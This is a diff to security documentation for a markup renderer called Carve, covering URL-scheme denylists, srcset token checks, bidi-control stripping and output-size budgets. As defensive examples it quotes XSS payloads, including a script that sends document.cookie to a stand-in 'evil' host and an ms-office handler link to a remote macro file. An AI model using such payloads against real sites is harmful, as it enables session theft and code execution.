@@ -115,13 +115,13 @@ Specifically, on every rendered element:
 - `srcset`, `imagesrcset`, `ping` and `attributionsrc` hold a **list** of URLs
   rather than one, so they are probed at **every** token **as well as** at the
   value's head, and any hit blanks the whole value. Reading only the leading
-  scheme meant
-  `srcset="safe.png 1x, javascript:alert(1) 2x"` rendered verbatim while the
-  same two candidates in the other order were blanked. The token pass is
+  scheme would render
+  `srcset="safe.png 1x, javascript:alert(1) 2x"` verbatim while blanking the
+  same two candidates in the other order. The token pass is
   additive rather than a replacement: the value-wide probe strips the ASCII
   whitespace the split breaks on, so `ping="java script:alert(1)"` is two
   harmless tokens and one denied value, and an engine that ran only the token
-  pass would deny **less** than it did before the rule existed. Prose
+  pass would deny **less** than the value-wide probe alone. Prose
   attributes - `title`, `alt`, `aria-label` - are deliberately **not**
   tokenized, so an ordinary colon in text is never mistaken for a scheme.
 
@@ -135,16 +135,16 @@ before relying on it in your chosen engine.
 
 Bidirectional-override and isolate control characters (U+202A–202E, U+2066–2069)
 can silently reorder the *visual* order of rendered text and code so the
-displayed source differs from what executes — the "Trojan Source" attack
+displayed source differs from what executes. This is the "Trojan Source" attack
 ([CVE-2021-42574](https://nvd.nist.gov/vuln/detail/CVE-2021-42574)). Carve
 neutralizes them (grammar PART 9 §26):
 
 - **Presentation output strips** bidi-override / isolate controls from text and
   code. This applies to HTML, Markdown, plain text, and terminal (ANSI) output.
-  They are *removed*, not entity-encoded — an HTML parser decodes `&#x202e;`
+  They are *removed*, not entity-encoded: an HTML parser decodes `&#x202e;`
   back to the live control, while a textual presentation target would otherwise
   keep the deceptive control live. The directional *marks* LRM / RLM (U+200E /
-  U+200F), which are legitimate for laying out genuine right-to-left text, are
+  U+200F), which are legitimate for laying out right-to-left text, are
   kept.
 - **Canonical Carve preserves source.** The `carve` target is a source
   serializer rather than a presentation target, so it retains authored bidi
@@ -177,8 +177,8 @@ its size rather than the ~O(n^2) a naive nested-link rescan would cost. The cap
 is enforced by the JavaScript, PHP, and Rust implementations.
 
 **Output amplification is bounded too.** Expansion features whose output can
-exceed their input — abbreviation expansion (`*[KEY]: …`) and the generated
-`::: index` — are charged against a per-render byte budget of
+exceed their input (abbreviation expansion, `*[KEY]: …`, and the generated
+`::: index`) are charged against a per-render byte budget of
 `max(1 MB, 8 × input length)`. Once a render would exceed it, further
 expansions degrade to plain text rather than allocating. This stops a small
 document (e.g. a 50 KB abbreviation reused thousands of times) from rendering to
@@ -349,7 +349,7 @@ What this means in practice for **untrusted input**:
 ### Worked examples: same input, Carve vs Markdown
 
 The Carve column is real output. The Markdown column is the per-spec
-(CommonMark / GFM) result *before* any downstream sanitizer runs — which is what
+(CommonMark / GFM) result *before* any downstream sanitizer runs, which is what
 an application gets if the sanitizer is missing or misconfigured.
 
 **1. Script URL in a link** — `[click](javascript:stealCookies)`
@@ -394,7 +394,7 @@ through.
 ```
 :::
 
-Carve has no "HTML block" auto-detection — a bare tag is *text*, escaped.
+Carve has no "HTML block" auto-detection: a bare tag is *text*, escaped.
 Markdown emits it live. (Carve's explicit raw-HTML construct is covered in the
 warning below.)
 
@@ -437,7 +437,7 @@ Themeable inline `<svg>` is an opt-in the host enables only for trusted content.
 
 ::: tip Defense in depth still applies
 Carve's URL/CSS hardening is a **denylist** of known-dangerous constructs, not a
-full allowlist sanitizer. For genuinely hostile input that may carry arbitrary
+full allowlist sanitizer. For hostile input that may carry arbitrary
 attributes, keep running the rendered HTML through a DOM sanitizer (e.g.
 DOMPurify) under a Content-Security-Policy. `SafeMode` / `Profile` add
 allowlist-style policies on top (see below).
@@ -460,7 +460,7 @@ Carve:
 <script>fetch("//evil/?" + document.cookie)</script>
 ```
 
-renders as escaped, inert text — `<p>&lt;iframe …&gt;…</p>`,
+renders as escaped, inert text: `<p>&lt;iframe …&gt;…</p>`,
 `<p>&lt;script&gt;…&lt;/script&gt;</p>`. Carve has no "HTML block"
 auto-detection, so a bare tag is never live markup. The only way to emit raw
 HTML is the **explicit** `` ```=html `` construct, which you disable for
@@ -486,7 +486,7 @@ always-on scheme denylist blanks these to `href=""`:
 | `ms-search:` `search-ms:` `shell:` `ms-cxh:` `vscode:` `jar:` | blanked |
 | `http:` `https:` `mailto:` `tel:` `ftp:` `sms:` | allowed (legitimate) |
 
-So `[open](ms-office:ofe|u|http://evil/x.docm)` becomes `<a href="">open</a>` —
+So `[open](ms-office:ofe|u|http://evil/x.docm)` becomes `<a href="">open</a>`;
 the OS handler is never reachable.
 
 ::: warning A denylist is a moving target
@@ -494,7 +494,7 @@ Blocking the *known* command-execution schemes closes the documented class, but
 new OS handlers appear. If your application turns link clicks into OS-handler
 invocations (a desktop preview, an editor), enable the scheme **allowlist**
 (`allowedUrlSchemes: ['http','https','mailto']`) so only vetted schemes ever
-reach an `href` — the robust, future-proof posture for that deployment.
+reach an `href`.
 :::
 
 ## Beyond the baseline: SafeMode and Profiles
